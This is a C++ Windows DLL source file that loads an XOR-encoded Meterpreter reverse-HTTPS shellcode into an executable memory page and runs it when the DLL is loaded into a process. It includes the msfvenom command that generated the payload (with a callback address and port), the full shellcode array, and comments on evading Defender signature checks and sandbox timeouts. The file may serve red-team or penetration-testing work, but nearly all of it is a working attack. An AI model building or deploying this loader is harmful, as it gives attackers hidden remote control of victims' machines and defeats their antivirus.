/* Payload.cpp
   ===========
   Creates a thread when loaded by a process that maps a rwx page in memory,
   copies the meterpreter payload into the memory and then executes it. Use
   an "xor" encoded payload to bypass signature detection on the DLL file.
   If using a x64 DLL payload, compile for x64 and see the commented section,
   break payload into additional shellcode arrays to bypass compiler limits.
   Tested against Windows 10 Enterprise Build 18363 with updated Defender.
*/
//#include "pch.h"
//#include "framework.h"
#include "Payload.h"
#include "memoryapi.h"
#include "wincrypt.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
extern "C" { int _afxForceUSRDLL; }

HINSTANCE g_hMainDll = NULL;

//msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.10.2 LPORT=443 --encoder x86/xor_dynamic -f c -o payload.c
char shellcode[] =
"\xeb\x23\x5b\x89\xdf\xb0\x9f\xfc\xae\x75\xfd\x89\xf9\x89\xde"
"\x8a\x06\x30\x07\x47\x66\x81\x3f\x74\x8a\x74\x08\x46\x80\x3e"
"\x9f\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x03\x02\x9f"
"\xff\xea\x81\x02\x03\x02\x63\x8b\xe6\x33\xc3\x66\x88\x52\x33"
"\x89\x51\x0e\x88\x50\x17\x89\x71\x2a\x0c\xb5\x49\x24\x32\xfd"
"\xaf\x3e\x62\x7e\x01\x2e\x23\xc3\xcc\x0f\x02\xc5\xe1\xf0\x51"
"\x55\x88\x50\x13\x89\x49\x3e\x88\x4e\x12\x7a\xe0\x4a\x02\xd3"
"\x52\x89\x5a\x22\x02\xd1\x88\x4b\x1b\xe1\x39\x4b\x88\x36\x88"
"\x03\xd5\x33\xfc\xae\xc2\xcd\x0e\x03\xc4\x3a\xe3\x77\xf5\x01"
"\x7e\xfa\x38\x7f\x27\x77\xe7\x5a\x88\x5a\x27\x03\xd0\x64\x88"
"\x0e\x48\x89\x5b\x1e\x02\xd1\x88\x06\x88\x03\xd3\x8b\x47\x26"
"\x27\x59\x58\x63\x5a\x58\x52\xfd\xe3\x5d\x5c\x58\x88\x10\xe8"
"\x8f\x5e\x6a\x6d\x67\x77\x02\x6b\x75\x6a\x6c\x6a\x56\x6b\x4e"
"\x74\x24\x04\xfd\xd6\x33\xd8\x51\x50\x51\x50\x51\xeb\x3c\x03"
"\x02\x03\x4f\x6c\x78\x6a\x6e\x6f\x63\x2c\x37\x2d\x32\x23\x2a"
"\x54\x6b\x6d\x66\x6c\x75\x70\x22\x4d\x56\x23\x34\x2d\x33\x38"
"\x22\x57\x70\x6a\x66\x66\x6c\x77\x2d\x34\x2c\x33\x39\x23\x70"
"\x75\x38\x32\x33\x2d\x32\x2a\x22\x6f\x6b\x68\x67\x23\x45\x66"
"\x61\x68\x6d\x03\x6a\x39\x54\x7a\xa5\xfc\xd7\x50\x51\x69\x01"
"\x50\x51\x6b\xb9\x02\x02\x03\xea\x82\x03\x03\x02\x2c\x52\x72"
"\x58\x69\x35\x33\x51\x56\x66\x76\x53\x36\x67\x57\x6a\x37\x58"
"\x76\x63\x4a\x68\x74\x54\x34\x68\x65\x47\x37\x72\x57\x5a\x4b"
"\x44\x31\x6a\x73\x58\x69\x64\x5b\x53\x5b\x41\x4b\x72\x74\x53"
"\x33\x4c\x75\x53\x59\x4b\x40\x65\x4a\x6b\x40\x3a\x40\x64\x4e"
"\x54\x55\x6e\x6a\x5a\x31\x65\x6b\x5d\x47\x66\x76\x40\x66\x33"
"\x55\x50\x73\x70\x50\x4b\x49\x41\x6e\x35\x6f\x5b\x55\x6e\x4b"
"\x67\x47\x55\x6e\x3b\x79\x3b\x76\x4d\x53\x30\x45\x41\x51\x71"
"\x4c\x45\x4d\x33\x31\x6a\x40\x60\x75\x4f\x5c\x70\x72\x53\x32"
"\x35\x55\x48\x6e\x48\x32\x47\x3b\x74\x4c\x49\x67\x66\x6d\x2f"
"\x73\x7b\x4f\x4e\x36\x2f\x52\x76\x56\x64\x71\x40\x4f\x5d\x6d"
"\x4a\x30\x4a\x60\x3a\x49\x4b\x74\x46\x30\x71\x4f\x51\x5b\x65"
"\x52\x54\x7b\x75\x47\x68\x6a\x4b\x62\x51\x64\x41\x2e\x7b\x33"
"\x5d\x59\x52\x7a\x37\x54\x4d\x62\x74\x40\x51\x31\x70\x59\x35"
"\x36\x45\x37\x5b\x4b\x3b\x47\x34\x2e\x66\x67\x50\x54\x76\x5b"
"\x6b\x75\x69\x6d\x6c\x5b\x5d\x73\x6c\x3b\x66\x32\x6f\x4a\x50"
"\x34\x52\x62\x73\x64\x70\x47\x75\x5a\x58\x70\x6d\x3a\x02\x53"
"\x6a\x54\x8b\x9c\xc4\xfc\xd7\x8a\xc4\x50\x6a\x03\x30\xeb\x86"
"\x50\x51\x50\x55\x50\x54\x6b\xe9\x56\x2c\x38\xfd\xd6\x94\x69"
"\x08\x5c\x6a\x83\x31\x03\x02\x8a\xe2\x69\x06\x53\x68\x1c\x54"
"\x6b\x77\x45\x9c\x85\xfd\xd6\x51\x50\x51\x50\x54\x6b\x2f\x05"
"\x1a\x78\xfd\xd6\x87\xc3\x77\x17\x6a\x8b\x11\x03\x02\x6b\x46"
"\xf3\x37\xe3\xfd\xd6\x4d\x76\xcf\xeb\x4a\x03\x02\x03\x68\x43"
"\x6a\x03\x12\x03\x02\x6b\x02\x03\x42\x03\x51\x6b\x5a\xa7\x51"
"\xe6\xfd\xd6\x91\x50\x51\x8a\xe5\x54\x6a\x03\x22\x03\x02\x50"
"\x54\x6b\x10\x95\x8b\xe1\xfd\xd6\x87\xc3\x76\xcc\x89\x04\x03"
"\xc0\x87\xc3\x77\xe6\x5a\xc0\x5d\xeb\x69\xfc\xfd\xfc\x33\x33"
"\x2c\x32\x32\x2d\x33\x37\x2c\x32\x37\x03\xb9\xf3\xb7\xa1\x54"
"\x69\x02\x50\xfd\xd6\x74\x8a";


DWORD WINAPI ClientThread(LPVOID lpParameter)
{
	MSG Msg;
	void* pShellcode;
	// use timer trick to timeout detections.
/*	int count = 0;
	void* expensive_operation;
	for (count = 0; count < 1000; count++) {
		Sleep(1000);
		expensive_operation = malloc(1000);
		free(expensive_operation);
	}*/
	HANDLE hProcess = GetCurrentProcess();
/*	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode) + sizeof(shellcode2) + sizeof(shellcode3) + sizeof(shellcode4), MEM_COMMIT, PAGE_EXECUTE_READWRITE);*/
	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode)-1);
/*	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) - 1), shellcode2, sizeof(shellcode2) - 1);
	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) + (unsigned long)sizeof(shellcode2) - 2), shellcode3, sizeof(shellcode3) - 1);
	memcpy((void*)((unsigned long)pShellcode + (unsigned long)sizeof(shellcode) + (unsigned long)sizeof(shellcode2) + (unsigned long)sizeof(shellcode3)- 3), shellcode4, sizeof(shellcode4) - 1);*/
	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return 0;
}

BOOL WINAPI EXPORT DllMain(IN PVOID hInstanceDll, IN ULONG dwReason, IN PVOID reserved)
{
	g_hMainDll = (HINSTANCE)hInstanceDll;
	HANDLE threadHandle = NULL;
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		threadHandle = CreateThread(NULL, 0, ClientThread, NULL, 0, NULL);
		if (threadHandle != NULL) {
			CloseHandle(threadHandle);
		}
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}